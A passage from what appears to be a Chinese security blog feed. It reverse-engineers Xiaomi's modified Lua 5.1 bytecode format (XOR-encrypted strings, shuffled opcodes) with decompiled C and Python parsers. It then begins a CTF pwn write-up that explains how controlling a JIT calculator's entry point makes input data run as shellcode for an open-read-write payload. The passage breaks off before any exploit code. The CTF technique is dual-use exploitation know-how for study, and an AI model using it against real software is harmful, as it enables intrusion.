href="https://github.com/zh-explorer/mi_lua/">zh-explorer/mi_lua: xiaomi lua anti (github.com)</a></p><p>利用python的constrcut包构建与luac文件等价的结构体</p><p>将魔改后的luac文件先parse为中间结构体(既不是完全与mogailuac等价的luac,也不是标准的luac),然后再通过该结构体build为标准的luac</p><p>最后通过调用外部unluac对其进行还原可读格式</p><h2 id="xiaomi"><a href="#xiaomi" class="headerlink" title="xiaomi"></a>xiaomi</h2><p>尝试恢复小米的luac文件,小米的lua版本是lua5.1</p><p>ida静态加载lua,按照前面的分析发现<code>luaL_loadfile</code>是个导入符号,grep搜索,可以知道这个符号来自<code>liblua.so.5.1.5</code></p><p>在顺着路线向下分析到达关键的<code>luaU_undump</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_11350</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">const</span> <span class="type">char</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">5</span>]; <span class="comment">// [sp+0h] [bp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">10</span>]; <span class="comment">// [sp+14h] [bp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v12; <span class="comment">// [sp+1Eh] [bp-32h]</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">10</span>]; <span class="comment">// [sp+24h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [sp+2Eh] [bp-22h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+34h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v15 = *(_DWORD *)off_2FFE8;</span><br><span class="line">  v5 = *(<span class="type">unsigned</span> __int8 *)a4;</span><br><span class="line">  v6 = v5 == <span class="number">61</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">61</span> )</span><br><span class="line">    v6 = v5 == <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    ++a4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">27</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a4 = <span class="string">&quot;binary string&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v10[<span class="number">3</span>] = (<span class="type">int</span>)a4;</span><br><span class="line">  v10[<span class="number">0</span>] = a1;</span><br><span class="line">  v10[<span class="number">1</span>] = a2;</span><br><span class="line">  v10[<span class="number">2</span>] = a3;</span><br><span class="line">  sub_112B8(v11);</span><br><span class="line">  sub_10A90(v10, v13, <span class="number">16</span>);</span><br><span class="line">  v7 = v14;</span><br><span class="line">  v14 = v12;</span><br><span class="line">  v10[<span class="number">4</span>] = v7 != v12;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v11, v13, <span class="number">16</span>) )</span><br><span class="line">    sub_10A5C(v10, <span class="string">&quot;bad header&quot;</span>);</span><br><span class="line">  v8 = luaS_newlstr(a1, <span class="string">&quot;=?&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_10D7C(v10, v8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="handle-header"><a href="#handle-header" class="headerlink" title="handle_header"></a>handle_header</h3><p>通过下面这个函数我们可以知道header信息,可以大致判断小米修改了标识头,并且size_size_t变为了4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_112B8</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  BOOL v1; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; <span class="string">&quot;\x1BFate/Z\x1B&quot;</span> &amp;&amp; a1 + <span class="number">8</span> &gt; <span class="string">&quot;\x1BFate/Z\x1B&quot;</span> )</span><br><span class="line">    __und(<span class="number">0</span>);</span><br><span class="line">  v1 = a1 &lt; <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="string">&quot;\x1BFate/Z\x1B&quot;</span> )</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    __und(<span class="number">0</span>);</span><br><span class="line">  result = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">memcpy</span>)();</span><br><span class="line">  a1[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">8</span>] = <span class="number">0x51</span>;</span><br><span class="line">  a1[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">  a1[<span class="number">14</span>] = <span class="number">8</span>;</span><br><span class="line">  a1[<span class="number">11</span>] = <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">12</span>] = <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">13</span>] = <span class="number">4</span>;</span><br><span class="line">  a1[<span class="number">15</span>] = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在脚本中的处理是,更改结构体定义</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GlobalHead = Struct(</span><br><span class="line">    <span class="string">&quot;signature&quot;</span> / Const(<span class="string">b&quot;\x1bFate/Z\x1b&quot;</span>),</span><br><span class="line">    <span class="string">&quot;version&quot;</span> / Version,</span><br><span class="line">    <span class="string">&quot;format&quot;</span> / Format,</span><br><span class="line">    <span class="string">&quot;endian&quot;</span> / Endian,</span><br><span class="line">    <span class="string">&quot;size_int&quot;</span> / Int8ul,</span><br><span class="line">    <span class="string">&quot;size_size_t&quot;</span> / Int8ul,</span><br><span class="line">    <span class="string">&quot;size_instruction&quot;</span> / Int8ul,</span><br><span class="line">    <span class="string">&quot;size_lua_number&quot;</span> / Int8ul,</span><br><span class="line">    <span class="string">&quot;lua_num_valid&quot;</span> / Byte</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>同时能够通过如下函数延迟绑定动态决定相关数据大小</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lua_type_define</span>(<span class="params">head</span>):</span><br><span class="line">    <span class="keyword">global</span> LuaInstruction, LuaInt, LuaNumber, LuaSize_t</span><br><span class="line">    <span class="keyword">if</span> head.size_int == <span class="number">4</span>:</span><br><span class="line">        LuaInt = Int32sl</span><br><span class="line">    <span class="keyword">elif</span> head.size_int == <span class="number">8</span>:</span><br><span class="line">        LuaInt = Int64sl</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LuaDecodeException(<span class="string">&quot;Unsupported size int&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head.size_size_t == <span class="number">4</span>:</span><br><span class="line">        LuaSize_t = Int32ul</span><br><span class="line">    <span class="keyword">elif</span> head.size_size_t == <span class="number">8</span>:</span><br><span class="line">        LuaSize_t = Int64ul</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LuaDecodeException(<span class="string">&quot;Unsupported size int&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head.size_lua_number == <span class="number">8</span>:</span><br><span class="line">        LuaNumber = Double</span><br><span class="line">    <span class="keyword">elif</span> head.size_lua_number == <span class="number">4</span>:</span><br><span class="line">        LuaNumber = Single</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LuaDecodeException(<span class="string">&quot;Unsupported size int&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head.size_instruction == <span class="number">4</span>:</span><br><span class="line">        LuaInstruction = Int32ul</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LuaDecodeException(<span class="string">&quot;Unsupported size int&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="handle-constans"><a href="#handle-constans" class="headerlink" title="handle_constans"></a>handle_constans</h3><p>接着进入Functioin的加载部分,主要关注switch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">switch</span> ( sub_10BEC(a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v42 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v43 = sub_10BEC(a1);</span><br><span class="line">        v42 = <span class="number">1</span>;</span><br><span class="line">        *(_DWORD *)(v40 + <span class="number">16</span> * i) = v43 != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        sub_10AC0(a1, &amp;v53, <span class="number">1</span>, <span class="number">8</span>, v52);</span><br><span class="line">        *(_QWORD *)v41 = v53;</span><br><span class="line">        v42 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        *(_DWORD *)(v40 + <span class="number">16</span> * i) = sub_10CB8(a1);</span><br><span class="line">        *(_DWORD *)(v41 + <span class="number">8</span>) = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        sub_10AC0(a1, &amp;v53, <span class="number">1</span>, <span class="number">4</span>, v52);</span><br><span class="line">        *(_DWORD *)(v40 + <span class="number">16</span> * i) = v53;</span><br><span class="line">        v42 = <span class="number">9</span>;</span><br><span class="line">LABEL_43:</span><br><span class="line">        *(_DWORD *)(v41 + <span class="number">8</span>) = v42;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_10A5C(a1, <span class="string">&quot;bad constant&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过比较操作的代码,可以知道小米只是将常量加了偏移3,但可以发现xiaomi多了一种常量处理,虽然不知道其是什么类型,但可以知道其是4字节大小</p><p>所以需要额外添加一个常量(这并不一定能够成功),然后因为不好分析其具体类型,就只能当作number来处理,并且数据经过尝试应该要是为float</p><p>偏移则通过解码时减去3处理,添加一种数据类型</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LuaDatatype = Enum(Byte,</span><br><span class="line">                   LUA_TNIL=<span class="number">0</span>,</span><br><span class="line">                   LUA_TBOOLEAN=<span class="number">1</span>,</span><br><span class="line">                   LUA_TLIGHTUSERDATA=<span class="number">2</span>,</span><br><span class="line">                   LUA_TNUMBER=<span class="number">3</span>,</span><br><span class="line">                   LUA_TSTRING=<span class="number">4</span>,</span><br><span class="line">                   LUA_TTABLE=<span class="number">5</span>,</span><br><span class="line">                   LUA_TFUNCTION=<span class="number">6</span>,</span><br><span class="line">                   LUA_TUSERDATA=<span class="number">7</span>,</span><br><span class="line">                   LUA_TTHREAD=<span class="number">8</span>,</span><br><span class="line">                   LUA_MIDATA=<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LuaDatatypeAdapter</span>(<span class="title class_ inherited__">Adapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">if</span> obj == <span class="number">12</span>:</span><br><span class="line">            logging.warning(<span class="string">&quot;translate may not success&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> LuaDatatype.parse(<span class="built_in">bytes</span>([obj - <span class="number">3</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([<span class="built_in">int</span>(obj) + <span class="number">3</span>])</span><br></pre></td></tr></table></figure><p>然后数据类型解析增加对应情况</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Constant = ConstantAdapter(Struct(</span><br><span class="line">    <span class="string">&quot;data_type&quot;</span> / LuaDatatypeAdapter(Byte),</span><br><span class="line">    <span class="string">&quot;data&quot;</span> / Switch(this.data_type,</span><br><span class="line">                    &#123;<span class="string">&quot;LUA_TNIL&quot;</span>: Pass, <span class="string">&quot;LUA_TBOOLEAN&quot;</span>: Flag,</span><br><span class="line">                     <span class="string">&quot;LUA_TNUMBER&quot;</span>: LazyBound(<span class="keyword">lambda</span>: LuaNumber), <span class="string">&quot;LUA_TSTRING&quot;</span>: String, <span class="string">&quot;LUA_MIDATA&quot;</span>: Int32ul&#125;)</span><br></pre></td></tr></table></figure><p>最后添加的数据类型还是按照处理数字类型的处理,但是数据转换为float</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ConstantAdapter</span>(<span class="title class_ inherited__">Adapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(obj.data_type) == <span class="number">9</span>:</span><br><span class="line">            obj.data_type = LuaDatatype.parse(<span class="string">b&#x27;\x03&#x27;</span>)</span><br><span class="line">            obj.data = <span class="built_in">float</span>(obj.data)</span><br><span class="line">        <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure><h4 id="handle-string"><a href="#handle-string" class="headerlink" title="handle_string"></a>handle_string</h4><p>继续通过观察xiaomi的十六进制数据,可以发现其中几乎没有明文字符串,但正常luac是能够找到一些明文的,所以猜测xiaomi还对字符串进行了加密</p><p>进入字符串获取的处理函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_10CB8</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r5</span></span><br><span class="line">  _BYTE *i; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [sp+0h] [bp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+4h] [bp-14h]</span></span><br><span class="line"></span><br><span class="line">  v6 = (<span class="type">unsigned</span> <span class="type">int</span>)a1;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v7 = *(_DWORD *)off_2FFE8;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(_DWORD *, <span class="type">unsigned</span> <span class="type">int</span> *, <span class="type">int</span>, <span class="type">int</span>))sub_10AC0)(a1, &amp;v6, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = sub_137C8(*a1, a1[<span class="number">2</span>]);</span><br><span class="line">  sub_10A90((<span class="type">int</span>)a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = (_BYTE *)v4; v6 &gt; (<span class="type">unsigned</span> <span class="type">int</span>)&amp;i[-v4]; ++i )</span><br><span class="line">    *i ^= <span class="number">13</span> * v6 + <span class="number">55</span>;</span><br><span class="line">  <span class="keyword">return</span> luaS_newlstr(*a1, v4, v6 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密部分是这一块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = (_BYTE *)v4; v6 &gt; (<span class="type">unsigned</span> <span class="type">int</span>)&amp;i[-v4]; ++i )</span><br><span class="line">  *i ^= <span class="number">13</span> * v6 + <span class="number">55</span>;</span><br></pre></td></tr></table></figure><p>v6通过上下文可以知道就是字符串的长度,那么对应的处理也就知晓</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StrAdapter</span>(<span class="title class_ inherited__">Adapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key, subcon</span>):</span><br><span class="line">        <span class="keyword">assert</span> key &lt; <span class="number">0xff</span></span><br><span class="line">        self.key = key</span><br><span class="line">        <span class="built_in">super</span>().__init__(subcon)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        l = []</span><br><span class="line">        key = evaluate(self.key, context)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> obj:</span><br><span class="line">            l.append(i ^ key)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(l)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        l = []</span><br><span class="line">        key = evaluate(self.key, context)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> obj:</span><br><span class="line">            l.append(i ^ key)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">String = Struct(</span><br><span class="line">    <span class="string">&quot;size&quot;</span> / LazyBound(<span class="keyword">lambda</span>: LuaSize_t),</span><br><span class="line">    <span class="string">&quot;str&quot;</span> / StrAdapter((this.size * <span class="number">13</span> + <span class="number">55</span>) &amp; <span class="number">0xff</span>, Bytes(this.size))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>原版的 <code>String</code> 结构非常直接，没有任何自定义的处理或操作,就是读取字符串长度 <code>size</code>,读取对应长度的字节流 <code>str</code>。</p><p>处理xiaomi的顺序,则是读取字符串长度<code>size</code>,然后通过<code>size</code>计算出密钥,然后读取<code>size</code>长度的字节流,最后对字节流按密钥处理</p><h3 id="handle-Opcode"><a href="#handle-Opcode" class="headerlink" title="handle_Opcode"></a>handle_Opcode</h3><p>最后xiaomi还对opcode顺序进行了打乱</p><p>此外xiaomi还打乱了Opcode的值与操作对应关系,一般就是通过与自己编译出来的作比较,判断出映射关系,建议以官方版本为对照,逐个去改版中找对应官方顺序的操作</p><p>找出对应的映射</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OpCodeMap = [<span class="number">20</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">19</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">34</span>, <span class="number">30</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">32</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">28</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">23</span>, <span class="number">23</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">31</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">22</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>然后根据OpCodeMap使用魔改后的opcode找到其实现的标准功能,并将其opcode转化为标准形式</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">InstructionsAdapter</span>(<span class="title class_ inherited__">Adapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        obj.opcode = OpCode.parse(integer2bits(OpCodeMap.index(<span class="built_in">int</span>(obj.opcode)), <span class="number">6</span>))</span><br><span class="line">        <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(obj.opcode) == <span class="number">2</span>:</span><br><span class="line">            logging.warning(<span class="string">&quot;find mi opcode&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> obj.C == <span class="number">0</span>:</span><br><span class="line">                op = <span class="number">29</span></span><br><span class="line">            <span class="keyword">elif</span> obj.C == <span class="number">1</span>:</span><br><span class="line">                op = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> obj.C == <span class="number">2</span>:</span><br><span class="line">                op = <span class="number">32</span></span><br><span class="line">            <span class="keyword">elif</span> obj.C == <span class="number">3</span>:</span><br><span class="line">                op = <span class="number">4</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                LuaDecodeException(<span class="string">&quot;opcode error&quot;</span>)</span><br><span class="line">            obj.opcode = OpCode.parse(integer2bits(OpCodeMap[op], <span class="number">6</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            obj.opcode = OpCode.parse(integer2bits(OpCodeMap[<span class="built_in">int</span>(obj.opcode)], <span class="number">6</span>))</span><br><span class="line">        <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">lualualualua</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="iot" scheme="https://ixout.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>2024ciscn华东南pwn</title>
    <link href="https://ixout.github.io/posts/22716/"/>
    <id>https://ixout.github.io/posts/22716/</id>
    <published>2024-06-24T07:59:49.000Z</published>
    <updated>2024-06-26T08:42:55.192Z</updated>
    
    <content type="html"><![CDATA[<h1 id="baby-jit"><a href="#baby-jit" class="headerlink" title="baby_jit"></a>baby_jit</h1><p>一道shellcode题</p><p>程序实现了一个计算器,按照指定格式<code>operation data</code>输入,exec时对输入进行parse并转换为机器码存放在分配出的固定区域<code>0x10000</code>,解析完后并执行</p><p>利用点在于shellcode执行的起始点可以被用户控制,如果将起始点控制为data区域,那么我们输入的data就会被作为机器码执行,配合jmp即可做到shellcode的完全执行</p><p>题目有禁用execve,需要orw</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 